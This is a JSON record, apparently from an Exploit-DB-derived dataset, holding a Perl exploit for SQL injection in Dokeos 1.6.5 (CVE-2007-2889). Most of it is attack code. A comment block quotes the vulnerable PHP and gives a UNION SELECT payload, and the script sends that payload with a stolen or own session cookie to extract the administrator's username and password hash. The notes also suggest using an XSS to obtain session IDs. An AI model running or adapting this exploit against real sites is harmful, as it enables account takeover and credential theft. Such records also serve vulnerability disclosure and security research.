{
  "id": "3980",
  "title": "Dokeos 1.6.5 - &#039;courseLog.php?scormcontopen&#039; SQL Injection",
  "cve": "CVE-2007-2889",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t      \t      Dokeos <= 1.6.5 SQL Injection Exploit\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (courseLog.php): \t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\tif ($_GET['scormcontopen'])\t\t\t\t\t\t#\r\n#\t{\t\t\t\t\t\t\t\t\t#\r\n#\tinclude_once(api_get_library_path().'/database.lib.php');\t\t#\r\n#\tinclude('../scorm/XMLencode.php');\t\t\t\t\t#\r\n#\t$TBL_SCORM_MAIN     = Database::get_scorm_main_table();\t\t\t#\r\n#\t$result = api_sql_query(\"SELECT contentTitle FROM $TBL_SCORM_MAIN \t#\r\n#\twhere (contentId=\".$_GET['scormcontopen'].\")\");\t\t\t\t#\r\n#\t$ar = mysql_fetch_array($result);\t\t\t\t\t#\r\n#\t$contentTitle = $ar['contentTitle'];\t\t\t\t\t#\r\n#\t$path=api_get_path('SYS_COURSE_PATH');\t\t\t\t\t#\r\n#\t$file=$path.$_cid.'/scorm'.$contentTitle.'/imsmanifest.xml';\t\t#\r\n#\t$charset = GetXMLEncode($file);\t\t\t\t\t\t#\r\n#\theader('Content-Type: text/html; charset='. $charset);\t\t\t#\r\n#\t}\t\t\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: /claroline/tracking/courseLog.php?scormcontopen=-999) UNION SELECT \t#\r\n#      CONCAT(char(58),char(58),username,char(58),char(58),password,char(58),\t#\r\n#      char(58)) FROM user WHERE user_id=1 /*\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: Having an already existant student/teacher account\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Notes: You need to obtain your current SESSION_ID; use your browser to \t#\r\n#\t disclose or find an XSS.\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 2){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"           \t   Dokeos <= 1.6.5 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_dokeos.pl [PATH] [SESSION_ID]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where Dokeos is located\\r\\n\";\r\nprint \"[SESSION_ID] = Session identifier of logged on user\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_dokeos.pl http://victim.com/dokeos/ cjjjauie95inbmo5fim8m93vo1\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n$cookie = \"$ARGV[1];\";\r\n$host = $ARGV[0] . \"claroline/tracking/courseLog.php?scormcontopen=-999) UNION SELECT CONCAT(char(58),char(58),username,char(58),char(58),password,char(58),char(58)) FROM user WHERE user_id=1 /*\";\r\n\r\nmy @cookie = ('Cookie' => \"dk_sid=$cookie;\");\r\nmy $res = $b->get($host, @cookie);\r\n\r\n$answer = $res->content;\r\nif ($answer =~ /scorm::(.*?)::/){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"           \t   Dokeos <= 1.6.5 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $1\\n\";\r\n}\r\n\r\nif ($answer =~/::([0-9a-fA-F]{32})::\\/imsmanifest.xml/){\r\nprint \"[+] Admin Hash : $1\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\nelse {\r\n  print \"\\nExploit Failed...\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-05-24]",
  "url": "https://www.exploit-db.com/exploits/3980"
}